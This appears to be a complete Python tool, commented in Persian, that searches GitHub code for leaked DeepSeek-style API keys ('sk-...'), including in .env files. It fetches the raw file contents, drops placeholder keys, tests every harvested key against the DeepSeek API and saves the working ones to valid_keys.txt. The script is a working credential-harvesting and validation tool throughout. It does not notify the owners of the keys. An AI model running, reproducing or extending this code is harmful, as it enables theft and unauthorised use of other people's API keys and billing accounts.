#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SHΞN™ DeepSeek Token Hunter - Improved for GitHub Actions
با تست سلامت واقعی و خروجی JSON
"""

import os
import sys
import re
import time
import json
import logging
import random
from datetime import datetime, timezone
from typing import List, Set, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ========================== تنظیمات ==========================
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN") or os.environ.get("PAT")
if not GITHUB_TOKEN:
    print("❌ GITHUB_TOKEN or PAT environment variable not set!")
    sys.exit(1)

DEEPSEEK_API_BASE = "https://api.deepseek.com"

ALLOWED_EXTENSIONS = {"js", "py", "php", "html", "json", "txt"}
EXTRA_PATTERNS = [
    'filename:.env',
    'path:.env',
]

KEY_PATTERNS = [
    '"sk-"',
    '"sk-proj-"',
    '"DEEPSEEK_API_KEY"',
]

MAX_PAGES_PER_QUERY = 10
CONCURRENT_WORKERS = 20
TEST_WORKERS = 10          # برای تست کلیدها
REQUEST_TIMEOUT = 15
TEST_TIMEOUT = 5
MAX_RETRY = 3
SAVE_INTERVAL = 20

DEEPSEEK_PATTERN = re.compile(r'sk-[a-zA-Z0-9]{32,}', re.IGNORECASE)
FAKE_KEY_PATTERNS = [
    r'^sk-example', r'^sk-test', r'^sk-111', r'^sk-000',
    r'^sk-aaaa', r'^sk-xxxx', r'^sk-placeholder', r'^sk-demo',
    r'^sk-sample', r'^sk-fake', r'^sk-dummy', r'^sk-change-me',
    r'^sk-replace', r'^sk-your-key', r'^sk-API_KEY', r'^sk-\*',
]

class DeepSeekHunter:
    def __init__(self, token: str, output_dir: str = "."):
        self.token = token
        self.output_dir = output_dir
        self.results_file = os.path.join(output_dir, "deepseek_results.json")
        self.valid_keys_file = os.path.join(output_dir, "valid_keys.txt")
        self.all_keys_file = os.path.join(output_dir, "all_keys.txt")
        self.checkpoint_file = os.path.join(output_dir, "checkpoint.json")
        
        self.found_keys: Dict[str, Dict] = {}  # key -> info
        self.processed_urls: Set[str] = set()
        self.lock = Lock()
        self.session = self._create_session()
        self.logger = self._setup_logger()
        self._load_checkpoint()
        self.request_count = 0
        self.rate_limit_reset = 0
        self.rate_limit_remaining = 5000

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=30, pool_maxsize=30)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.headers.update({
            'Authorization': f'token {self.token}',
            'Accept': 'application/vnd.github.v3.text-match+json',
            'User-Agent': 'DeepSeekHunter/4.0'
        })
        return session

    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger('DeepSeekHunter')
        logger.setLevel(logging.INFO)
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        ch.setFormatter(formatter)
        logger.addHandler(ch)
        return logger

    def _load_checkpoint(self):
        if os.path.exists(self.checkpoint_file):
            try:
                with open(self.checkpoint_file, 'r') as f:
                    data = json.load(f)
                with self.lock:
                    self.found_keys = data.get('found_keys', {})
                    self.processed_urls = set(data.get('processed_urls', []))
                self.logger.info(f"Checkpoint loaded: {len(self.found_keys)} keys, {len(self.processed_urls)} URLs")
            except Exception as e:
                self.logger.warning(f"Could not load checkpoint: {e}")

    def _save_checkpoint(self):
        with self.lock:
            data = {
                'found_keys': self.found_keys,
                'processed_urls': list(self.processed_urls),
                'timestamp': time.time()
            }
        try:
            with open(self.checkpoint_file, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            self.logger.warning(f"Could not save checkpoint: {e}")

    def _is_fake_key(self, key: str) -> bool:
        for pattern in FAKE_KEY_PATTERNS:
            if re.search(pattern, key, re.IGNORECASE):
                return True
        return False

    def _extract_keys_from_text(self, text: str, source_url: str, repo: str, file_path: str) -> List[str]:
        keys = []
        with self.lock:
            found_keys = self.found_keys
        for match in DEEPSEEK_PATTERN.finditer(text):
            key = match.group(0)
            if len(key) >= 32 and not self._is_fake_key(key):
                with self.lock:
                    if key not in found_keys:
                        self.found_keys[key] = {
                            "key": key,
                            "source": source_url,
                            "repo": repo,
                            "file": file_path,
                            "valid": None,
                            "tested_at": None,
                            "error": None
                        }
                        keys.append(key)
                        self.logger.info(f"✅ Found new key: {key[:10]}... from {file_path}")
        return keys

    def _handle_rate_limit(self, resp: requests.Response):
        remaining = resp.headers.get('X-RateLimit-Remaining')
        reset = resp.headers.get('X-RateLimit-Reset')
        if remaining is not None:
            self.rate_limit_remaining = int(remaining)
        if reset is not None:
            self.rate_limit_reset = int(reset)
        if self.rate_limit_remaining == 0:
            wait_time = max(0, self.rate_limit_reset - time.time()) + 5
            self.logger.warning(f"⏳ Rate limit exhausted. Waiting {wait_time/60:.1f} minutes...")
            time.sleep(wait_time)
            self.rate_limit_remaining = 5000

    def _github_request(self, url: str, params: Optional[Dict] = None, retry_count: int = 0) -> Optional[Dict]:
        try:
            resp = self.session.get(url, params=params, timeout=REQUEST_TIMEOUT)
            self.request_count += 1
            self._handle_rate_limit(resp)
            if resp.status_code == 200:
                return resp.json()
            elif resp.status_code == 401:
                self.logger.error("❌ Token is invalid or expired!")
                sys.exit(1)
            elif resp.status_code == 403:
                if 'rate limit' in resp.text.lower():
                    self.logger.warning("Rate limit hit. Retrying after delay...")
                    time.sleep(60)
                    if retry_count < MAX_RETRY:
                        return self._github_request(url, params, retry_count + 1)
                else:
                    self.logger.error(f"HTTP 403: {resp.text[:200]}")
                return None
            elif resp.status_code == 404:
                return None
            elif resp.status_code == 429:
                self.logger.warning("Too many requests. Waiting 60s...")
                time.sleep(60)
                if retry_count < MAX_RETRY:
                    return self._github_request(url, params, retry_count + 1)
                return None
            else:
                self.logger.warning(f"HTTP {resp.status_code} for {url}")
                if retry_count < MAX_RETRY:
                    time.sleep(5)
                    return self._github_request(url, params, retry_count + 1)
                return None
        except Exception as e:
            self.logger.error(f"Request error: {e}")
            if retry_count < MAX_RETRY:
                time.sleep(10)
                return self._github_request(url, params, retry_count + 1)
            return None

    def _search_code(self, query: str, page: int = 1) -> Tuple[List[Dict], int]:
        url = 'https://api.github.com/search/code'
        params = {'q': query, 'per_page': 100, 'page': page}
        data = self._github_request(url, params)
        if not data:
            return [], 0
        return data.get('items', []), data.get('total_count', 0)

    def _fetch_raw_content(self, html_url: str) -> Optional[str]:
        raw_url = html_url.replace('https://github.com/', 'https://raw.githubusercontent.com/')
        raw_url = raw_url.replace('/blob/', '/')
        try:
            resp = self.session.get(raw_url, timeout=REQUEST_TIMEOUT)
            if resp.status_code == 200:
                return resp.text
        except:
            pass
        api_url = html_url.replace('https://github.com/', 'https://api.github.com/repos/')
        api_url = api_url.replace('/blob/', '/contents/')
        try:
            resp = self.session.get(api_url, timeout=REQUEST_TIMEOUT)
            if resp.status_code == 200:
                data = resp.json()
                if 'content' in data:
                    import base64
                    return base64.b64decode(data['content']).decode('utf-8', errors='ignore')
        except:
            pass
        return None

    def _process_file(self, item: Dict) -> List[str]:
        html_url = item.get('html_url', '')
        with self.lock:
            if html_url in self.processed_urls:
                return []
            self.processed_urls.add(html_url)
        repo = item.get('repository', {}).get('full_name', 'unknown')
        path = item.get('path', 'unknown')
        extracted = []
        text_matches = item.get('text_matches', [])
        for tm in text_matches:
            fragment = tm.get('fragment', '')
            if fragment:
                keys = self._extract_keys_from_text(fragment, html_url, repo, path)
                extracted.extend(keys)
        if not extracted:
            content = self._fetch_raw_content(html_url)
            if content:
                keys = self._extract_keys_from_text(content, html_url, repo, path)
                extracted.extend(keys)
        with self.lock:
            if len(self.processed_urls) % SAVE_INTERVAL == 0:
                self._save_checkpoint()
        return extracted

    def _search_query(self, query: str, max_pages: int) -> Set[str]:
        found = set()
        page = 1
        self.logger.info(f"🔍 Query: {query[:60]}...")
        while page <= max_pages:
            self.logger.info(f"  Page {page}/{max_pages}")
            items, total = self._search_code(query, page)
            if not items:
                break
            with ThreadPoolExecutor(max_workers=CONCURRENT_WORKERS) as executor:
                futures = [executor.submit(self._process_file, item) for item in items]
                for future in as_completed(futures):
                    keys = future.result()
                    for k in keys:
                        found.add(k)
            self.logger.info(f"    Found {len(found)} new keys (total {len(self.found_keys)})")
            if total <= page * 100:
                break
            page += 1
            time.sleep(0.5)
        return found

    def test_key(self, key_info: Dict) -> Dict:
        """تست یک کلید با درخواست به DeepSeek API"""
        key = key_info["key"]
        url = f"{DEEPSEEK_API_BASE}/v1/models"
        headers = {"Authorization": f"Bearer {key}"}
        try:
            resp = requests.get(url, headers=headers, timeout=TEST_TIMEOUT)
            if resp.status_code == 200:
                key_info["valid"] = True
                key_info["error"] = None
                self.logger.info(f"✅ Valid key: {key[:10]}...")
            elif resp.status_code == 401:
                key_info["valid"] = False
                key_info["error"] = "Invalid key (401)"
                self.logger.debug(f"❌ Invalid key: {key[:10]}...")
            else:
                key_info["valid"] = False
                key_info["error"] = f"HTTP {resp.status_code}"
        except requests.exceptions.Timeout:
            key_info["valid"] = None
            key_info["error"] = "Timeout"
        except Exception as e:
            key_info["valid"] = None
            key_info["error"] = str(e)
        key_info["tested_at"] = datetime.now(timezone.utc).isoformat()
        return key_info

    def test_all_keys(self):
        """تست همه کلیدهای پیدا شده به صورت همزمان"""
        with self.lock:
            keys_to_test = [info for info in self.found_keys.values() if info.get("valid") is None]
        if not keys_to_test:
            self.logger.info("No keys to test.")
            return
        self.logger.info(f"🧪 Testing {len(keys_to_test)} keys with DeepSeek API...")
        tested = 0
        with ThreadPoolExecutor(max_workers=TEST_WORKERS) as executor:
            futures = [executor.submit(self.test_key, info) for info in keys_to_test]
            for future in as_completed(futures):
                tested += 1
                if tested % 10 == 0:
                    self.logger.info(f"  Tested {tested}/{len(keys_to_test)} keys")
        # به‌روزرسانی checkpoint
        self._save_checkpoint()
        self._save_results()

    def _build_queries(self) -> List[str]:
        """ساخت کوئری‌های جستجو بر اساس پسوندهای مجاز و الگوهای کلید"""
        queries = []
        for pattern in KEY_PATTERNS:
            for ext in ALLOWED_EXTENSIONS:
                queries.append(f'{pattern} extension:{ext}')
            # اضافه کردن فایل‌های خاص بدون پسوند
            if pattern in ('"sk-"', '"sk-proj-"'):
                for extra in EXTRA_PATTERNS:
                    queries.append(f'{pattern} {extra}')
        # حذف تکراری‌ها
        return list(set(queries))

    def run(self):
        self.logger.info("🚀 Starting DeepSeek Hunter (GitHub Actions ready)")
        queries = self._build_queries()
        self.logger.info(f"📋 Using {len(queries)} queries, max {MAX_PAGES_PER_QUERY} pages each")
        total_found = 0
        for idx, query in enumerate(queries, 1):
            self.logger.info(f"\n[{idx}/{len(queries)}] {query}")
            found = self._search_query(query, MAX_PAGES_PER_QUERY)
            total_found += len(found)
            self._save_checkpoint()
            self.logger.info(f"📊 Progress: {idx}/{len(queries)} queries done, {len(self.found_keys)} total keys")
        self.logger.info(f"\n🔍 Search completed. Found {len(self.found_keys)} unique keys.")
        # تست سلامت
        self.test_all_keys()
        self._save_results()
        valid_count = sum(1 for info in self.found_keys.values() if info.get("valid") is True)
        self.logger.info(f"✅ Valid keys: {valid_count}")
        self.logger.info(f"📁 Results saved to {self.results_file}")

    def _save_results(self):
        """ذخیره نتایج نهایی به JSON و فایل‌های متنی"""
        with self.lock:
            keys_list = list(self.found_keys.values())
        # ذخیره JSON کامل
        with open(self.results_file, 'w', encoding='utf-8') as f:
            json.dump(keys_list, f, indent=2, ensure_ascii=False)
        # ذخیره کلیدهای معتبر (هر خط یک کلید)
        valid_keys = [info["key"] for info in keys_list if info.get("valid") is True]
        with open(self.valid_keys_file, 'w', encoding='utf-8') as f:
            for key in valid_keys:
                f.write(key + '\n')
        # ذخیره همه کلیدها (هر خط یک کلید)
        all_keys = [info["key"] for info in keys_list]
        with open(self.all_keys_file, 'w', encoding='utf-8') as f:
            for key in all_keys:
                f.write(key + '\n')
        self.logger.info(f"Saved {len(valid_keys)} valid keys to {self.valid_keys_file}")
        self.logger.info(f"Saved {len(all_keys)} total keys to {self.all_keys_file}")

if __name__ == '__main__':
    hunter = DeepSeekHunter(GITHUB_TOKEN)
    hunter.run()
